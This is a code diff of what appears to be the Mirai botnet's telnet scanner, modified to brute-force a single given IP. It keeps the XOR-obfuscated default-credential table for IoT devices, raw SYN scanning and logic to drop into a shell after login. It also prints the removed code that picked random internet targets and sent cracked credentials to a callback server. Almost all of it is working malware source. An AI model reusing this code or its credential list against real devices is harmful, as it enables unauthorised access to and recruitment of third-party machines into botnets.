@@ -50,7 +50,7 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     return ret;
 }
 
-int main(int argc, char **args)
+void scanner_loop(ipv4_t ip)
 {
     int i;
     uint16_t source_port;
@@ -93,6 +93,8 @@ int main(int argc, char **args)
     }
     while (ntohs(source_port) < 1024);
 
+	printf("[scanner] port: %d\n", ntohs(source_port) );
+
     iph = (struct iphdr *)scanner_rawpkt;
     tcph = (struct tcphdr *)(iph + 1);
 
@@ -112,6 +114,7 @@ int main(int argc, char **args)
     tcph->syn = TRUE;
 
     // Set up passwords
+    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
@@ -173,20 +176,21 @@ int main(int argc, char **args)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
-    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
-
+    
 
 
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 
-
     // Main logic loop
-    while (TRUE)
+    //while (TRUE)
+    for ( int asdf = 0; asdf<3; asdf++ )
     {
         fd_set fdset_rd, fdset_wr;
-        struct scanner_connection *conn;
+        struct scanner_connection *conn = conn_table;
         struct timeval tim;
         int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
+
+/*
 
         // Spew out SYN to try and get a response
         if (fake_time != last_spew)
@@ -201,11 +205,10 @@ int main(int argc, char **args)
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
-                iph->daddr = get_random_ip();
+                iph->daddr = ip;//0x2a8c0+(i << 24); //get_random_ip();
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
-                printf("[scanner] Using ip %x\n",iph->daddr);            
 
                 if (i % 10 == 0)
                 {
@@ -277,22 +280,25 @@ int main(int argc, char **args)
             if (conn == NULL)
                 break;
 
-            conn->dst_addr = iph->saddr;
-            conn->dst_port = tcph->source;
-            setup_connection(conn);
+
 
             printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
 
         }
-
+*/
         // Load file descriptors into fdsets
         FD_ZERO(&fdset_rd);
         FD_ZERO(&fdset_wr);
-        for (i = 0; i < SCANNER_MAX_CONNS; i++)
-        {
+
+
             int timeout;
 
-            conn = &conn_table[i];
+            conn->dst_addr = ip;
+            conn->dst_port = htons(23);
+            setup_connection(conn);
+
+            printf("[scanner] Using ip %d.%d.%d.%d\n", conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);            
+
             timeout = (conn->state > SC_CONNECTING ? 30 : 5);
 
             if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
@@ -309,6 +315,7 @@ int main(int argc, char **args)
                     if (++(conn->tries) == 10)
                     {
                         conn->tries = 0;
+                        conn->passtries = 0;
                         conn->state = SC_CLOSED;
                     }
                     else
@@ -322,6 +329,7 @@ int main(int argc, char **args)
                 else
                 {
                     conn->tries = 0;
+                    conn->passtries = 0;
                     conn->state = SC_CLOSED;
                 }
                 continue;
@@ -339,7 +347,6 @@ int main(int argc, char **args)
                 if (conn->fd > mfd_rd)
                     mfd_rd = conn->fd;
             }
-        }
 
         tim.tv_usec = 0;
         tim.tv_sec = 1;
@@ -362,7 +369,7 @@ int main(int argc, char **args)
                 if (err == 0 && ret == 0)
                 {
                     conn->state = SC_HANDLE_IACS;
-                    conn->auth = random_auth_entry();
+                    conn->auth = auth_entry(conn->passtries); 
                     conn->rdbuf_pos = 0;
 
                     printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
@@ -376,6 +383,7 @@ int main(int argc, char **args)
                     close(conn->fd);
                     conn->fd = -1;
                     conn->tries = 0;
+                    conn->passtries = 0;
                     conn->state = SC_CLOSED;
                     continue;
                 }
@@ -419,6 +427,7 @@ int main(int argc, char **args)
                             if (++(conn->tries) >= 10)
                             {
                                 conn->tries = 0;
+                                conn->passtries = 0;
                                 conn->state = SC_CLOSED;
                             }
                             else
@@ -480,9 +489,7 @@ int main(int argc, char **args)
                                 char *tmp_str;
                                 int tmp_len;
 
-
                                 printf("[scanner] FD%d received shell prompt\n", conn->fd);
-
 
                                 // Send enable / system / shell / sh to session to drop into shell if needed
                                 table_unlock_val(TABLE_SCAN_ENABLE);
@@ -512,7 +519,7 @@ int main(int argc, char **args)
                                 conn->state = SC_WAITING_SYSTEM_RESP;
                             }
                             break;
-			case SC_WAITING_SYSTEM_RESP:
+			            case SC_WAITING_SYSTEM_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
                                 char *tmp_str;
@@ -581,9 +588,10 @@ int main(int argc, char **args)
                                 conn->fd = -1;
 
                                 // Retry
-                                if (++(conn->tries) == 10)
+                                if (++(conn->passtries) == auth_table_len) 
                                 {
                                     conn->tries = 0;
+                                    conn->passtries = 0;
                                     conn->state = SC_CLOSED;
                                 }
                                 else
@@ -600,8 +608,8 @@ int main(int argc, char **args)
                                 int tmp_len;
 
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
+                                printf("[report] Connection succesful: %s:%s@%d.%d.%d.%d:%d\n",conn->auth->username, conn->auth->password, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff, conn->dst_port);
 
-                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                 close(conn->fd);
                                 conn->fd = -1;
                                 conn->state = SC_CLOSED;
@@ -630,11 +638,6 @@ int main(int argc, char **args)
     }
 }
 
-void scanner_kill(void)
-{
-    kill(scanner_pid, 9);
-}
-
 static void setup_connection(struct scanner_connection *conn)
 {
     struct sockaddr_in addr = {0};
@@ -661,38 +664,6 @@ static void setup_connection(struct scanner_connection *conn)
     conn->last_recv = fake_time;
     conn->state = SC_CONNECTING;
     connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
-}
-
-static ipv4_t get_random_ip(void)
-{
-    uint32_t tmp;
-    uint8_t o1, o2, o3, o4;
-
-    do
-    {
-        tmp = rand_next();
-
-        o1 = tmp & 0xff;
-        o2 = (tmp >> 8) & 0xff;
-        o3 = (tmp >> 16) & 0xff;
-        o4 = (tmp >> 24) & 0xff;
-    }
-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
-          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
-          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
-          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
-          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
-          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
-          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
-          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
-          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
-          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    );
-
-    return INET_ADDR(o1,o2,o3,o4);
 }
 
 static int consume_iacs(struct scanner_connection *conn)
@@ -874,82 +845,9 @@ static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
     auth_table_max_weight += weight;
 }
 
-static struct scanner_auth *random_auth_entry(void)
+static struct scanner_auth *auth_entry(int id)
 {
-    int i;
-    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);
-
-    for (i = 0; i < auth_table_len; i++)
-    {
-        if (r < auth_table[i].weight_min)
-            continue;
-        else if (r < auth_table[i].weight_max)
-            return &auth_table[i];
-    }
-
-    return NULL;
-}
-
-static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
-{
-    struct sockaddr_in addr;
-    int pid = fork(), fd;
-    struct resolv_entries *entries = NULL;
-
-    if (pid > 0 || pid == -1)
-        return;
-
-    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-    {
-
-        printf("[report] Failed to call socket()\n");
-
-        exit(0);
-    }
-
-    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
-    table_unlock_val(TABLE_SCAN_CB_PORT);
-
-    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
-    if (entries == NULL)
-    {
-
-        printf("[report] Failed to resolve report address\n");
-
-        return;
-    }
-    addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
-    resolv_entries_free(entries);
-
-    table_lock_val(TABLE_SCAN_CB_DOMAIN);
-    table_lock_val(TABLE_SCAN_CB_PORT);
-
-    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
-    {
-
-        printf("[report] Failed to connect to scanner callback!\n");
-
-        close(fd);
-        exit(0);
-    }
-
-    uint8_t zero = 0;
-    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
-    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
-    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
-    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
-    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
-    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
-    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);
-
-
-    printf("[report] Send scan result to loader\n");
-
-
-    close(fd);
-    exit(0);
+    return &auth_table[id];
 }
 
 static char *deobf(char *str, int *len)
